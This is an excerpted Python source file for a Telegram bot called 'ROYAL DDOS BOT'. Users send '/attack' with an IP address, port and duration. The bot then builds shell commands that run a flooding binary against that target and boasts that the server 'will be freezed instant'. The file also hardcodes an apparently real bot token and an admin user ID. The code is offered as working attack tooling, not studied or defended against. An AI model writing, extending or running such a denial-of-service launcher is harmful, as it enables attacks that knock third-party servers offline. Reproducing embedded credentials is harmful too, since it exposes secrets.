...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7629169137:AAE2XATlR-es8Zt9aNNfRHM_wiC8UwcdbpY'
ADMIN_USER_ID = 6482410971 
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "*🔥 Welcome to the ROYAL DDOS BOT! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let us Freeze Server! ⚔️💥*"
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./THAKUR {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./THAKUR {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./THAKUR {ip} {port} {duration} {byte_size} {threads}"

    # Send attack details to the user
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Royal Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Server will be freezed instant! 💥*"
    ), parse_mode='Markdown')
